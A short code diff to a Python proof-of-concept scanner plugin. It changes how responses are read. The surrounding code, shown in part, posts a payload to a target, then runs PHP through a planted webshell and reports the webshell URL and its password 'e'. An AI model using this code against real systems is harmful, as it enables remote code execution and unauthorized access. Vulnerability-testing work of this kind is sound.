@@ -61,7 +61,7 @@ class Poc(ABPoc):
             urllib.request.urlopen(url, data=payload)
             request = urllib.request.Request(
                 webshell_url, data="e=echo strrev(gwesdvjvncqwdijqiwdqwduhq);")
-            response = urllib.request.urlopen(request).read()
+            response = str(urllib.request.urlopen(request).read())
             if 'gwesdvjvncqwdijqiwdqwduhq'[::-1] in response:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -85,7 +85,7 @@ class Poc(ABPoc):
             urllib.request.urlopen(url, data=payload)
             request = urllib.request.Request(
                 webshell_url, data="e=echo strrev(gwesdvjvncqwdijqiwdqwduhq);")
-            response = urllib.request.urlopen(request).read()
+            response = str(urllib.request.urlopen(request).read())
             if 'gwesdvjvncqwdijqiwdqwduhq'[::-1] in response:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取到的信息:vul_url={url},Webshell={webshell_url}, Webshell_PWD=e'.format(
                     target=self.target, name=self.vuln.name, url=url, webshell_url=webshell_url))
